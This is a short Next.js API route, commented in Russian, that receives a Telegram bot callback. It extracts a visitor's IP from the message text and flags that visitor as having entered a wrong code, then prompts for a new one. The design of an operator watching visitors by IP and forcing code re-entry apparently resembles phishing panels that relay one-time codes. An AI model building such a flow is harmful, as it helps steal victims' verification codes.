import { NextRequest, NextResponse } from 'next/server';
import { setCodeErrorFlag } from '../codeErrorStore';

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    if (body.callback_query && body.callback_query.data === 'code_error') {
      // Получаем IP из сообщения
      const messageText = body.callback_query.message.text;
      console.log('Message text:', messageText); // Для отладки
      
      // Изменяем регулярку для более точного поиска IP
      const ipMatch = messageText.match(/🌍 <b>IP:<\/b> ([^\n]+)/);
      const ip = ipMatch ? ipMatch[1].trim() : 'Unknown';
      console.log('Extracted IP:', ip); // Для отладки
      
      setCodeErrorFlag(ip, true);
      
      // Отправляем ответ в Telegram
      const answerUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/answerCallbackQuery`;
      await fetch(answerUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: body.callback_query.id,
          text: 'Запрошен новый код'
        })
      });
      
      return NextResponse.json({ ok: true });
    }
    return NextResponse.json({ ok: false, error: 'No callback_query or wrong data' }, { status: 400 });
  } catch (e) {
    console.error('Callback error:', e); // Для отладки
    return NextResponse.json({ ok: false, error: e?.toString() }, { status: 500 });
  }
} 